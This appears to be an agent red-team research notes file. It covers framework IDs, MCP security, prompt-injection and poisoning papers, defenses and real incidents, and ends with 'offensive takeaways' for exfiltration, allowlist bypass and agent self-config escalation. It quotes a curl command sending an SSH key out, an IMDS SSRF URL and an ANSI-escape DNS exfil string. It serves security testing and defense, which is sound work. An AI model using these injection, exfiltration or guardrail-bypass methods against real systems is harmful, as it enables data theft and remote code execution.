# Agent Red-Team Research Base (verified 2026-09-10)

Every entry below was fetched from its primary source this session. Anything unverified is marked. This file is the evidence layer behind `REFERENCES.md`; cite from here.

---

## 1. Framework IDs — CORRECTIONS the library must apply

The library currently cites **OWASP LLM 2025 numbering**, **OWASP Agentic v1.0 (T1–T15)**, and **AML.T0053 = "LLM Plugin Compromise"**. All three are now stale.

### OWASP Top 10 for LLM Applications — 2026 edition exists
Resource page states published **2026-08-03**, v1.0 (the PDF's own cover still reads "[Publication date to be set]" — cite the resource-page date, note the draft flag). Renumbered vs 2025:

| 2026 ID | Title | Was in 2025 |
|---|---|---|
| LLM01 | Prompt Injection | LLM01 (same) |
| LLM02 | Sensitive Information Disclosure | LLM02 (same) |
| LLM03 | Excessive Agency | LLM06 (climbed) |
| LLM04 | Supply Chain | LLM03 |
| LLM05 | Data and Model Poisoning | LLM04 |
| LLM06 | Unbounded Consumption | LLM10 |
| LLM07 | Misinformation | LLM09 |
| LLM08 | Hidden Context Exposure | LLM07 System Prompt Leakage (renamed/rescoped) |
| LLM09 | Vector and Embedding Weaknesses | LLM08 |
| LLM10 | Improper Output Handling | LLM05 (fell) |

Source: https://genai.owasp.org/resource/owasp-genai-llm-top-10-2026/ · PDF /download/56857
**Recommendation:** cite as `OWASP LLM 2025:LLMxx` where the skill is validated against 2025, and add the 2026 equivalent in parentheses. Do NOT silently swap — a report reviewer may be on either edition. The safest form: "LLM06:2025 Excessive Agency (= LLM03:2026)".

### OWASP Top 10 for Agentic Applications 2026 — ASI01–ASI10 IS REAL (published 2025-12-09)
Resolves the library's internal contradiction (matrix said T1–T15, native-memory + hunt-llm-ai said ASI). **Both exist and are different documents.**

| ID | Title |
|---|---|
| ASI01 | Agent Goal Hijack |
| ASI02 | Tool Misuse and Exploitation |
| ASI03 | Identity and Privilege Abuse |
| ASI04 | Agentic Supply Chain Vulnerabilities |
| ASI05 | Unexpected Code Execution (RCE) |
| ASI06 | Memory & Context Poisoning |
| ASI07 | Insecure Inter-Agent Communication |
| ASI08 | Cascading Failures |
| ASI09 | Human-Agent Trust Exploitation |
| ASI10 | Rogue Agents |

Source: https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/ · PDF /download/52117

### OWASP Agentic AI – Threats and Mitigations — now v1.1 (Dec 2025), T1–T17
Library says v1.0 / T1–T15. Two threats added:

T1 Memory Poisoning · T2 Tool Misuse · T3 Privilege Compromise · T4 Resource Overload · T5 Cascading Hallucination Attacks · T6 Intent Breaking & Goal Manipulation · T7 Misaligned & Deceptive Behaviors · T8 Repudiation & Untraceability · T9 Identity Spoofing & Impersonation · T10 Overwhelming Human in the Loop · T11 Unexpected RCE and Code Attacks · T12 Agent Communication Poisoning · T13 Rogue Agents in Multi-Agent Systems · T14 Human Attacks on Multi-Agent Systems · T15 Human Manipulation · **T16 Insecure Inter-Agent Protocol Abuse** · **T17 Supply Chain Compromise**.
Source: PDF /download/45674 (cover "Version 1.1, December 2025")

### MITRE ATLAS v5.6.0 (data through 2026-04-30) — critical fixes
- **AML.T0053 = "AI Agent Tool Invocation"** — NOT "LLM Plugin Compromise". Library's mapping is wrong across many skills. This is the correct home for tool-misuse findings.
- AML.T0051 LLM Prompt Injection: **.000 Direct · .001 Indirect · .002 Triggered**
- **AML.T0034.002 = "Agentic Resource Consumption"** — correct map for `resource-abuse`.
- AML.T0070 RAG Poisoning · T0066 Retrieval Content Crafting · T0064 Gather RAG-Indexed Targets — for `rag`.
- AML.T0067 LLM Trusted Output Components Manipulation (+.000 Citations) — citation spoofing.
- AML.T0069 Discover LLM System Information (.000 Special Character Sets · .001 System Instruction Keywords · .002 System Prompt) + T0056 Extract LLM System Prompt — for `prompt-extraction`.
- AML.T0054 LLM Jailbreak · T0068 LLM Prompt Obfuscation · T0065 LLM Prompt Crafting — for `guardrail-evasion`.
- AML.T0057 LLM Data Leakage · T0055 Unsecured Credentials · T0050 Command and Scripting Interpreter · T0011.000 Unsafe AI Artifacts · T0010 AI Supply Chain Compromise · T0061 LLM Prompt Self-Replication (worms).
- **AML.T0040 = "AI Model Inference API Access"** — library cites it for race/TOCTOU; that's wrong (T0040 is model access, not concurrency). Use CWE-367 for TOCTOU; ATLAS has no clean TOCTOU technique.
- **"AML.T0108" does not exist** — a summarizer invented it; verified absent from ATLAS.yaml.
Source: https://raw.githubusercontent.com/mitre-atlas/atlas-data/main/dist/ATLAS.yaml

### CSA MAESTRO — L1–L7 as the library states (Ken Huang, 2025-02-06). No change.

---

## 2. MCP + A2A protocol security (primary spec text)

### MCP Security Best Practices — spec revision 2025-11-25
Named attacks in the spec itself (cite these, not blog paraphrases):
- **Confused Deputy** — static client_id + dynamic registration + consent cookie → auth-code theft without consent. Fix: per-client consent, exact redirect_uri match, `state` set only after consent.
- **Token Passthrough** — MCP server accepting tokens not issued *to it*; "MUST NOT". Enables audience-confusion + rate-limit bypass + audit-trail loss.
- **SSRF via OAuth metadata discovery** — malicious server puts `http://169.254.169.254/` in `resource_metadata`/`authorization_servers` → client fetches cloud IMDS. Fix: block RFC1918/link-local, HTTPS-only, egress proxy.
- **Session Hijacking** — prompt-injection variant (event queue keyed by session id) + impersonation variant. "MUST NOT use sessions for authentication"; bind `<user_id>:<session_id>`.
- **Local MCP Server Compromise** — malicious startup command in client config; `npx malicious && curl -d @~/.ssh/id_rsa`. Fix: consent dialog showing full command, sandbox.
- **OAuth Authorization URL Validation** — `javascript:`/`data:` auth URL → XSS → RCE; shell-based URL opening → command injection. Fix: allowlist http/https, no shell to open URLs.
- **stdio Transport Security in Proxy Scenarios** — XSS → steal proxy token → spawn arbitrary stdio child → RCE.
- **Scope Minimization** — omnibus scopes (`files:*`, `*`) inflate blast radius; progressive elevation via `WWW-Authenticate scope=`.
Source: https://modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices

### A2A protocol v1.0
Auth delegated to HTTP transport (OAuth2/OIDC/API-key declared in Agent Card `security` field); server MUST validate every request, 401/403. Agent Card advertises per-skill auth. Documented threats: MITM (TLS), eavesdropping/tampering (TLS 1.2+). Thin on injection/impersonation — gap.
Source: https://a2a-protocol.org/latest/topics/enterprise-ready/

---

## 3. Academic corpus (attacks + benchmarks)

- **Not what you've signed up for: …Indirect Prompt Injection** — Greshake et al., arXiv:2302.12173, 2023-02 (rev 05). Coined indirect prompt injection: retrieved data acts as arbitrary-code-execution-equivalent; demonstrated on Bing GPT-4 chat. Foundational cite for every indirect-injection skill.
- **AgentDojo: Dynamic Environment to Evaluate PI Attacks and Defenses for LLM Agents** — Debenedetti et al., arXiv:2406.13352, NeurIPS 2024 D&B, 2024-06. **97 realistic tasks, 629 security test cases.** The standard reproducibility harness — every injection/tool skill should point at it.
- **InjecAgent: Benchmarking Indirect PI in Tool-Integrated LLM Agents** — Zhan et al., arXiv:2403.02691, ACL 2024 findings, 2024-03. **1,054 cases, 17 user tools, 62 attacker tools, 30 agents. ReAct-GPT-4 vulnerable 24%; ~doubles with a "hacking prompt" enhancement.**
- **Agent Security Bench (ASB)** — Zhang et al., **arXiv:2410.02644**, ICLR 2025, 2024-10 (rev v4 2025-05). Formalizes PI, memory poisoning, Plan-of-Thought backdoor, mixed attacks. **Highest avg attack success 84.30%; defenses "limited effectiveness."** (ID verified 2026-09-10.)
- **AgentHarm: Benchmark for Measuring Harmfulness of LLM Agents** — Andriushchenko et al., **arXiv:2410.09024**, ICLR 2025, 2024-10 (rev 2025-04). 110 malicious tasks (440 augmented), 11 harm categories; frontier LLMs "surprisingly compliant" without jailbreak; universal jailbreak templates transfer to agents. (ID verified 2026-09-10; distinct from ASB above.)
- **PoisonedRAG: Knowledge Corruption Attacks to RAG** — Zou, Geng, Wang, Jia, arXiv:2402.07867, 2024-02. **90% attack success injecting just 5 malicious texts per target question** into million-doc corpora. Headline number for `rag` corpus poisoning.
- **MCP Safety Audit: LLMs with MCP Allow Major Security Exploits** — Radosevich & Halloran, arXiv:2504.03767, 2025-04. Malicious code exec / remote access / credential theft via MCP tools; ships **MCPSafetyScanner** (github.com/johnhalloran321/mcpSafetyScanner).
- **AgentPoison: Red-teaming LLM Agents via Poisoning Memory or Knowledge Bases** — Zhaorun Chen et al., **arXiv:2407.12784**, NeurIPS 2024. Optimized backdoor trigger: **>80% attack success at <0.1% poison rate, <1% benign-performance impact** (targets agent memory / RAG KB). ID + numbers verified 2026-09-10.
- **MINJA — Memory Injection Attacks on LLM Agents via Query-Only Interaction** — Shen Dong et al., **arXiv:2503.03704**. Black-box, **queries only** (no memory access), ~98% injection success via bridging steps + indication prompt. Backs `hunt-agent-memory-poisoning`. (verified 2026-09-11)
- **Text Embeddings Reveal (Almost) As Much As Text** — John X. Morris et al., **arXiv:2310.06816**. Iterative inversion **recovers 92% of 32-token inputs exactly**; recovered names from clinical-note embeddings. Backs `hunt-agent-rag` embedding-inversion. (verified 2026-09-11)
- **Sponge Examples: Energy-Latency Attacks on Neural Networks** — Ilia Shumailov et al., **arXiv:2006.03463**. Crafted inputs raise energy/latency **10–200×** — the worst-case-compute primitive behind `hunt-agent-resource-abuse` (with OWASP LLM10:2025 Unbounded Consumption + ATLAS AML.T0034 Cost Harvesting incl. .002 Agentic Resource Consumption). (verified 2026-09-11)
- **Prompt Infection: LLM-to-LLM Prompt Injection within Multi-Agent Systems** — Donghyun Lee & Mo Tiwari, **arXiv:2410.07283**. A payload instructing each agent to copy itself into its output **self-replicates across interconnected agents like a worm**, spreading even without full message sharing; multi-agent systems "highly susceptible"; proposes LLM Tagging. Backs `hunt-agent-multi-agent` (ASI07/ASI10, ATLAS AML.T0061). (verified 2026-09-11)
- **Red-Teaming Coding Agents from a Tool-Invocation Perspective (ToolLeak)** — Yuchong Xie et al., **arXiv:2509.05755** (2025-09-06). Two-phase: extract the system prompt via tool-argument retrieval, then hijack tool invocation via injection in tool descriptions/return values → **RCE on EVERY tested agent-LLM pair** (Cursor, Claude Code, Copilot, Windsurf, Cline, Trae); prompt leak on 19/25 pairs. The strongest quantified coding-agent cite — backs `hunt-agent-config-poisoning`, `hunt-agent-tool-injection`, `hunt-agent-prompt-extraction`. (verified 2026-09-12)
- **WASP: Benchmarking Web Agent Security Against Prompt Injection Attacks** — Ivan Evtimov et al., **arXiv:2504.18575**. End-to-end web-UI-agent PI benchmark; attacks **partially succeed in up to 86%** of cases. Backs `hunt-agent-browser-use`. (verified 2026-09-12)
- **RedTeamCUA: Realistic Adversarial Testing of Computer-Use Agents in Hybrid Web-OS Environments** — Zeyi Liao et al., **arXiv:2505.21936**, ICLR 2026. RTC-Bench = **864 hybrid web-OS attack examples**; **Claude 3.7 Sonnet CUA 42.9% ASR**, OpenAI Operator 7.6% (most secure evaluated). Backs `hunt-agent-browser-use`. (verified 2026-09-12)
- **OS-Harm: A Benchmark for Measuring Safety of Computer Use Agents** — Thomas Kuntz et al., **arXiv:2506.14866**. 150 tasks on OSWorld across three harm classes — deliberate misuse, **prompt injection**, model misbehavior (incl. data exfiltration); automated judge (0.76/0.79 F1). Backs `hunt-agent-browser-use`. (verified 2026-09-12)
- **LivePI: More Realistic Benchmarking of Agents Against Indirect Prompt Injection** — Lei Zhao et al., **arXiv:2605.17986** (2026-05). Realistic indirect-PI benchmark; **total ASR 10.7%–29.6%** across five models (lower than lab benchmarks — cite for a defensible real-world indirect-PI rate). Backs `hunt-agent-prompt-injection`. (verified 2026-09-12)
- **A Survey on Agentic Security: Applications, Threats and Defenses** — Asif Shahriar et al., **arXiv:2510.06445** (2025-10). Taxonomy of **260+ papers** (applications / threats / defenses); concludes agentic systems are "structurally fragile by default," needing lifecycle-spanning defenses. The umbrella reference for `THREAT-MODEL.md` / `ai-agent-methodology`. (verified 2026-09-12)

### MCP-specific security benchmarks (back `hunt-agent-mcp-supply-chain` / `hunt-agent-mcp-exposure`)
- **MCPTox: A Benchmark for Tool Poisoning Attack on Real-World MCP Servers** — Zhiqiang Wang et al., **arXiv:2508.14925**. Built on **45 live real-world MCP servers / 353 authentic tools**, 1,312 malicious cases / 10 risk categories, 20 agents; top **ASR 72.8% (o1-mini)**, and "more capable models are often MORE susceptible." The hardest primary tool-poisoning number. (verified 2026-09-12)
- **MCPSecBench: A Systematic Security Benchmark and Playground for Testing MCP** — Yixuan Yang et al., **arXiv:2508.13220**. **17 attack types across 4 surfaces** (user/host/transport/server), 3 major platforms; key finding: **current protection mechanisms are largely ineffective (<30% avg success)**. (verified 2026-09-12)
- **MCP-SafetyBench: Safety Evaluation of LLMs with Real-World MCP Servers** — Xuanjun Zong et al., **arXiv:2512.15163**. Unified taxonomy of **20 MCP attack types** across 5 domains (browser/finance/navigation/repo/web-search); "all models remain vulnerable," explicit safety-utility trade-off. **Host-side attacks are the most effective at 81.94% avg ASR** (vs user-side 39.39%); **Identity Injection / Spoofing = 100% across all 13 tested models** ("a universal vulnerability," §4.2 + Table 10). Both numbers primary-confirmed from the paper HTML 2026-09-12 — the sharpest MCP host-side figures to quote.

## 4. Defenses (with measured numbers — for DEFENSES-AND-DETECTION.md)

- **Defeating Prompt Injections by Design (CaMeL)** — Debenedetti et al., arXiv:2503.18813, 2025-03. Separates control flow from data flow + capability-based policy on tool calls. **~77% AgentDojo task completion WITH provable security vs 84% without** — i.e. a real, measurable utility cost, not free. The strongest "by design" defense to cite.
- **Design Patterns for Securing LLM Agents against Prompt Injections** — Beurer-Kellner et al., arXiv:2506.08837, 2025-06. Six patterns: **Action-Selector · Plan-Then-Execute · LLM Map-Reduce · Dual LLM · Code-Then-Execute · Context-Minimization**, each trading utility for provable-ish resistance. This is the defense taxonomy DEFENSES-AND-DETECTION should map remediations to.
- **OpenAI — Preventing URL-Based Data Exfiltration in LM Agents** (2026-02, cdn.openai.com pdf). Allowlist = only crawler-indexed URLs + user-typed URLs; **concedes "leakage of bits still seems straightforward"** via multi-URL character-mapping. Use to argue allowlists ≠ safe.
- **Lethal trifecta** — Willison, 2025-06-16: private data + untrusted content + external comms. Defenders can't 100% prevent; the control is *removing one leg*. Guardrails "95% effective" are insufficient. Frames every exfil finding's severity.

### Defenses fail under ADAPTIVE attack — the numbers to quote (verified 2026-09-12)
The single most important defense fact for a report: **static-benchmark near-zero ASR collapses once the attacker optimizes against the deployed defense.** Never accept a vendor's benchmark score at face value.
- **The Attacker Moves Second** — Nasr, Carlini, Sitawarin et al. (OpenAI + Anthropic + Google DeepMind), **arXiv:2510.09023** (2025-10-10). Adaptive attacks (gradient / RL / search) bypass **12 published defenses at >90% ASR**; **human red-teaming = 100%** across all — despite many defenses originally claiming near-zero. Static example-attacks are inadequate evaluation.
- **Adaptive Attacks Break Defenses Against Indirect PI on LLM Agents** — Qiusi Zhan et al., **arXiv:2503.00061** (NAACL 2025 Findings). **8 defenses, all broken, >50% ASR**.
- **StruQ** (arXiv:2402.06363) — structured queries, **<2% ASR vs optimization-free** attacks (but not vs adaptive). **SecAlign** (Sizhe Chen et al., arXiv:2410.05451) — preference-optimization, injections **<10% defended** in-distribution — yet adaptive attacks reported **72.5–82.5%** on defended Llama-3 / Mistral. Trained defenses look great until the attacker adapts.
- **What actually holds (cite as the recommendation):**
  - **Agents Rule of Two** — Meta, 2025-10-31. A session may satisfy at most **two** of {(A) process untrusted input · (B) access sensitive data · (C) change state / communicate externally}; needing all three ⇒ human-in-the-loop. The operational form of the lethal trifecta — a design constraint, not a filter.
  - **Out-of-band deterministic policy** family — CaMeL (2503.18813, ~77% vs 84% utility), plus FIDES / Progent / RTBAS / FORGE, surveyed in "Adaptive Evaluation of OOB Defenses" (**arXiv:2606.26479**). Security enforced *outside* the model.
  - **RETA — Reasoning-enabled Task Alignment** (Lipeng He et al., **arXiv:2606.15441**, 2026-06). Keeps every per-attack ASR **<10%** under six black-box adaptive attacks (avg 2.92% / 3.75%) while preserving utility — a current strong result, still not zero.
- **Takeaway for the client:** prompt injection is **unsolved**. Recommend a *design constraint* (Rule of Two / remove a trifecta leg / OOB policy), not a model-level filter whose benchmark number an adaptive attacker erases. Any "our guardrail blocks 99%" claim is a static-benchmark artifact — say so.

### Network-level detection — the layer that generalizes (verified 2026-09-12)
Where model-level filters fail, **network-level** detection (observe what the agent actually *does* on the wire, not what it says) is the most promising detection layer to recommend as defense-in-depth:
- **ShieldNet** — Zhuowen Yuan et al., **arXiv:2604.04426** (2026-04). A **MITM proxy + event extractor + lightweight classifier** detects supply-chain/tool-poisoning by real network behavior. On **SC-Inject-Bench** (10,000+ malicious MCP tools, 25+ ATT&CK-derived types) it hits **up to 0.995 F1 at 0.8% FP**, low overhead, **beating MCP scanners and LLM-based guardrails**. The detection recommendation for MCP/tool supply-chain findings.
- **LlamaFirewall** — Sahana Chennabasappa et al., **arXiv:2505.03574** (2025-05), open-source: **PromptGuard 2** (jailbreak/injection detector), **Agent Alignment Checks** (chain-of-thought auditor for indirect injection / goal misalignment), **CodeShield** (static analysis vs insecure codegen). The open-source guardrail stack to name.
- **BUT the guardrail is itself a target** — **"From Shield to Target: DoS on LLM Agent Guardrails"** (Yuguang Zhou et al., **arXiv:2606.14517**, 2026-06): payloads that maximize the guardrail's *reasoning length* cause **13–63× token amplification** and **up to 148× latency**; one poisoned document can **saturate shared guardrail infra and starve co-located agents**. So an LLM-based guardrail adds a denial-of-wallet/DoS surface — recommend network-level (ShieldNet) or deterministic policy over an LLM-judge guardrail, and rate-limit the guardrail itself. (Also backs `hunt-agent-resource-abuse`.)

## 5. Real-world / in-the-wild (Embrace The Red — Rehberger; verified via blog index + posts)

- **EchoLeak (M365 Copilot, CVE-2025-32711, CVSS 9.3 critical)** — zero-click indirect PI via a single crafted email; Aim Security's **"LLM Scope Violation"** makes Copilot pull internal SharePoint/OneDrive/Teams/chat data and exfil it, bypassing link/image restrictions via Microsoft-trusted domains. Disclosed June 2025, server-side patch same month, no in-the-wild exploitation. (CVSS + technique verified 2026-09-10.)
- **ForcedLeak (Salesforce Agentforce, CVSS 9.4, Noma Security, disclosed 2025-07-28)** — indirect PI in a **Web-to-Lead Description field**; when staff ask Agentforce to process the lead, the payload queries CRM and exfils via an **image URL to an expired CSP-allowlisted domain** (`my-salesforce-cms.com`) the researchers re-bought for **~$5**. Textbook allowlist-bypass: a trusted domain that lapsed. Patched 2025-09-08 (Trusted URLs Enforcement + domain reclaimed).
- **Month of AI Bugs (2025-07/08, Rehberger)** — coding-agent corpus: Amazon Q Developer (invisible PI, 2025-08-20), Windsurf (secret exfil, invisible instructions, **SpAIware memory-persistent exfil** via auto-`create_memory` 2025-08-22), AWS Kiro (arbitrary command exec via indirect PI 2025-08-26), Cline data exfil, Manus (PI exposes VS Code server to internet). Pattern: agents auto-write their own config/memory with no approval.
- **ChatGPT Deep Research connectors data spill (2025-08-24)** — indirect PI in Linear tickets + MCP tool-description field → cross-connector data sent to attacker MCP server. Confused-deputy across a shared trust boundary. (This class = ShadowLeak.)
- **Claude Pirate (2025-10-28)** — abused Anthropic's own Files API (allowlisted `api.anthropic.com`) with attacker's API key to exfil chat history; up to 30MB/upload. Allowlist useless when the trusted domain itself carries the channel.
- **Cross-Agent Privilege Escalation (2025-09-24)** — compromised Copilot writes malicious `.mcp.json`/instruction files that Claude Code then executes; agents "free" each other. Maps ASI07 + ASI10.
- **AgentHopper (2025-08-29)** — PoC AI virus: infected coding agent injects universal PI payload into every git repo it can push; next dev's agent pulls it → self-propagates. Flips its own YOLO/allowlist config. Maps AML.T0061 self-replication.
- **Agent Commander / promptware C2 (2026-03-16)** — compromised agents beacon to a C2 for objectives; persistence via a `HEARTBEAT.md` run every 30 min, output suppressed with `HEARTBEAT_OK`. Document/email/website delivery variants.
- **Computer-Use TOCTOU (2026-06-25)** — screen changes during multi-second inference; phishing "Continue" button lands where Outlook "Send" appears → agent clicks Send. Affected Claude Computer-Use, ChatGPT Operator. Fix: verify pixels unchanged before action.
- **Scary Agent Skills (2026-02-11)** — invisible Unicode Tag instructions inside skill markdown; affects Claude Code, Copilot(4.5), Gemini CLI, Codex, Grok. Detect via ASCII Smuggler / consecutive-tag-run scanner.
- **DiLLMa / ANSI→DNS exfil (2026-07-16)** — PI makes a CLI agent emit ANSI escape (`\e]7;file://data.attacker/\a`) → terminal fires DNS with data in the label. macOS Terminal pre-Tahoe 26.1.
- **Breaking Claude Code Auto Mode (2026-08-26)** — Python module-shadowing: served ZIP w/ malicious `struct.py`; Claude's own decoder imports poisoned module → RCE + C2 + nested Claude instances. **60–80% ASR small-sample.** Vendor: "auto mode is a best-effort classifier, not a security guarantee."

### Agent self-config poisoning (backs `hunt-agent-config-poisoning`)
- **Rules File Backdoor** (Pillar Security) — invisible Unicode (bidi markers, zero-width joiners, Tags block) in `.cursor/rules`/rules files → agent emits backdoored code (malicious script tags, weak crypto, credential exfil) and hides it from chat; survives forks; poisons every future generation. Disclosed Cursor **2025-02-26**, Copilot **2025-03-12**; GitHub added a hidden-Unicode warning 2025-05-01. https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents
- **CVE-2025-53773** (GitHub Copilot + VS Code) — prompt injection writes `"chat.tools.autoApprove": true` into `.vscode/settings.json` (YOLO mode); Copilot writes workspace files with no approval and the change is immediately live → **wormable RCE**. Reported 2025-06-29, patched Aug 2025 Patch Tuesday. (Rehberger.)
- **CVE-2025-54135 "CurXecute"** (Cursor, **CVSS 8.6**, Aim Labs) — indirect injection writes `.cursor/mcp.json`; suggested edits land on disk and **execute before the user accepts/rejects** → RCE. Fixed 1.3.9. Companion **CVE-2025-54136 "MCPoison"** (MCP-config trust persistence).
- **CVE-2025-59536** (Claude Code, **CVSS 8.7**, Check Point) — repo `.mcp.json` + `.claude/settings.json` (`enableAllProjectMcpServers: true`) run commands **on launch, before the trust dialog is accepted**, when opening an untrusted directory. Reported 2025-09-03, fixed 1.0.111. Companion **CVE-2026-21852**.
- **Cross-Agent Priv-Esc** (Rehberger 2025-09-24) + **AgentHopper** (self-propagation, 2025-08-29) + **Windsurf SpAIware** (auto-`create_memory`, 2025-08-22) — see §5 real-world entries; the config-file angle is the unapproved self-write.
- Root cause across all: **the agent can write its own config/settings/MCP/hook files with no approval, and config is loaded or executed before consent** — so any injection becomes RCE or a shipped backdoor.

### Model / artifact supply chain — registry pickle (backs `hunt-agent-deserialization`)
- **nullifAI** (ReversingLabs, disclosed ~2025-01, HF removed within 24h) — **two malicious PyTorch models** on Hugging Face; a **reverse shell (→107.173.7.141)** at the start of the pickle stream + a broken opcode after it; **7z (not default zip) dodged `torch.load()` and Picklescan**; pickle executes opcodes sequentially so the shell fired before the corruption error. Picklescan's blacklist "validate-then-scan" missed it; models were live **8+ months**. https://www.reversinglabs.com/blog/rl-identifies-malware-ml-model-hosted-on-hugging-face
- **Sleepy Pickle** (Boyan Milanov, Trail of Bits, 2024-06-11) — **Fickling**-injected payload modifies the model **in place** on deserialize (weights or hooked inference) → backdoor / steered outputs / data exfil via a hooked forward pass; no disk trace, one file, conditional activation, survives host sandbox/egress because it lives *inside the model*. https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/
- **PickleBall: Secure Deserialization of Pickle-based ML Models** (Andreas D. Kellas et al., **arXiv:2508.15987**, 2025-08) — static-analysis policy + dynamic drop-in loader; **rejects 100% malicious, loads 79.8% benign** (+22% vs SOTA). Key stat: **44.9% of popular HF models still use insecure pickle**. The defense to recommend alongside safetensors-only.
- Mapping: OWASP LLM03/LLM04, ASI04; MITRE ATLAS **AML.T0010.003 (AI Supply Chain: Model)**, **T0011.000 (User Execution: Unsafe AI Artifacts)**, **T0058 (Publish Poisoned Models)**; CWE-502. Tool: **Fickling** (Trail of Bits).

### Browser / computer-use agents (backs `hunt-agent-browser-use`)
- **Comet indirect-injection Account Takeover (Brave, 2025-08-20)** — "summarize this Reddit thread" → payload hidden behind a spoiler tag → agent reads user email, triggers OTP, reads the OTP from the already-authenticated Gmail tab, exfiltrates via a reply. Full ATO. SOP/CORS irrelevant: one agent acts across all the user's authenticated origins. Look-alike origin used a trailing dot (`perplexity.ai.`). https://brave.com/blog/comet-prompt-injection/
- **Comet screenshot/OCR injection (Brave, 2025-10-21)** — faint light-blue-on-yellow text in a page image, invisible to the user, OCR'd and executed as a command. DOM sanitization misses it entirely. https://brave.com/blog/unseeable-prompt-injections/
- **Dissecting Adversarial Robustness of Multimodal LM Agents** — Wu, Shah, Koh, Salakhutdinov, Fried, Raghunathan, arXiv:2406.12814 (rev 2025-02, ICLR). Imperceptible perturbation to **<5% of page pixels → up to 67% ASR on VisualWebArena**, surviving reflection/tree-search; inference-time "improvements" raised relative ASR 15–20%.
- **Computer-Use TOCTOU (Rehberger, 2026-06-25)** — see §5; the canonical screen-swap-under-the-agent finding. Affected Claude Computer-Use + ChatGPT Operator.
- Root-cause across all: agents give **no trust boundary between the user's instruction and perceived page/screen content**, and run in the user's **fully-authenticated** browser profile.

## 6. Tooling (repos verified via papers/index)
| Tool | Tests | Where |
|---|---|---|
| NVIDIA garak | LLM vuln scan (probes) | github.com/NVIDIA/garak — broad pre-engagement sweep |
| Microsoft PyRIT | red-team automation, Crescendo | github.com/Azure/PyRIT — multi-turn jailbreak orchestration |
| promptfoo | eval/red-team harness | promptfoo.dev — regression + injection suites |
| AgentDojo | PI attacks/defenses on tool agents | github.com/ethz-spylab/agentdojo — reproduce tool-injection findings |
| MCPSafetyScanner | audits an arbitrary MCP server | github.com/johnhalloran321/mcpSafetyScanner |
| Invariant mcp-scan | scans MCP servers for tool poisoning | github.com/invariantlabs-ai/mcp-scan |
| ASCII Smuggler | reveal Unicode-tag hidden instructions | embracethered tool — smuggling detection |

---

## 7. Offensive takeaways to operationalize
1. Score exfil by the **lethal trifecta** (Willison): only findings where all three legs coexist are payable exfil.
2. **Trusted-domain exfil beats allowlists** — EchoLeak (Microsoft domains), Claude Pirate (api.anthropic.com), **ForcedLeak (an EXPIRED domain still on Salesforce's CSP allowlist, re-bought for $5)**. Always (a) test the allowlisted domain itself as a channel and (b) check every allowlisted domain for expiry/takeover.
3. **Agent self-config write = escalation primitive** — `.mcp.json`, memory files, AGENTS.md/CLAUDE.md, YOLO/allowlist toggles. If the agent can write its own config with no approval, that's the finding (cross-agent-escal, AgentHopper, Windsurf SpAIware).
4. **Invisible Unicode-tag instructions** land on Claude Code/Copilot/Gemini/Codex/Grok — carry the payload in skills/docs/tickets (ETR 2026-02).
5. **Reflection/side channels for blind exfil**: ANSI→DNS (terminal), error-message reflection, DNS labels. Test the channel the DLP doesn't parse.
6. **Benchmark-anchor every report**: cite AgentDojo (629 cases) / InjecAgent (24% ReAct-GPT-4) / ASB (84.3% ASR) / PoisonedRAG (5 texts → 90%) so severity isn't hand-waved.
7. **MCP confused-deputy** is a concrete OAuth flow, not hand-waving — static client_id + consent cookie. Cite the spec's own section.
8. **Persistence via heartbeat files** (Agent Commander HEARTBEAT.md every 30min) — look for any recurring agent task file as a C2/persistence sink.
9. **Computer-use TOCTOU**: inject a delay, swap the UI under the agent between decision and click.

## 8. Claims that would be WRONG to make
- "AML.T0053 = LLM Plugin Compromise" — it's **AI Agent Tool Invocation** (v5.6.0).
- "OWASP Agentic uses only T1–T15" — it's **T1–T17** (v1.1) AND there's a separate **ASI01–ASI10** Top 10.
- "There is no OWASP agentic top-10 / ASI is invented" — **ASI01–ASI10 is published (2025-12-09)**.
- "LLM07 = System Prompt Leakage" in 2026 — renamed **Hidden Context Exposure (LLM08:2026)**.
- "Guardrails give 95% protection so it's safe" — trifecta/CaMeL show residual leak; not a security boundary.
- "Allowlisting egress domains stops exfil" — OpenAI's own paper concedes bit-leakage; EchoLeak/Claude Pirate bypass via trusted domains.
- "AML.T0108" / "AML.T0040 = TOCTOU" — T0108 doesn't exist; T0040 is AI Model Inference API Access.

## 9. Gaps in the current library (candidate new skills / sections)
- **Computer-use / browser-agent attacks** (screen TOCTOU, DOM/pixel injection, deep-link abuse) — **CLOSED: shipped as `hunt-agent-browser-use`** (2026-09-10), backed by the §5 browser corpus above.
- **Agent self-config / instruction-file poisoning** — **CLOSED: shipped as `hunt-agent-config-poisoning`** (2026-09-10), backed by the Rules File Backdoor + config-injection CVE corpus above.
- **Inter-agent worms / self-replication** (AML.T0061; AgentHopper, Prompt Infection) — multi-agent skill should add the worm/propagation pattern explicitly.
- **Delegated-identity / OAuth confused-deputy** (MCP spec, token passthrough) — **CLOSED: folded into `hunt-agent-mcp-exposure`** (2026-09-10) as the "Delegated identity — OAuth confused deputy & token abuse" technique, citing the spec's own sections (§2).
- **Benchmark + tooling section** — no skill currently tells the operator to reproduce on AgentDojo/InjecAgent or run garak/PyRIT/mcp-scan.
</content>
</invoke>

## 10. 2026-H2 update — verified this pass (2026-10)

New work since the sections above; each item below was checked to a primary/named source.

- **OWASP MCP Top 10 (v0.1, 2025)** — the first dedicated Top-10 for Model Context Protocol. Ten categories: MCP01 Token Mismanagement & Secret Exposure, MCP02 Privilege Escalation via Scope Creep, **MCP03 Tool Poisoning** (incl. rug-pull, **tool shadowing**, schema poisoning as sub-techniques), MCP04 Supply-Chain/Dependency Tampering, **MCP05 Command Injection & Execution**, MCP06 Intent-Flow Subversion (prompt injection via context), MCP07 Insufficient AuthN/AuthZ, MCP08 Lack of Audit/Telemetry, MCP09 Shadow MCP Servers, MCP10 Context Injection & Over-Sharing. Mapped to skills + lab gates in `COVERAGE-MATRIX.md`.
- **CVE-2025-6514** (mcp-remote, **CVSS 9.6**, CWE-78 OS command injection; JFrog, Jul 2025; fixed 0.1.16; package >437k downloads) — command injection when `mcp-remote` connects to an untrusted MCP server. Encoded deterministically as `lab/exploits/exploit_mcp_stdio_rce.py` (MCP05).
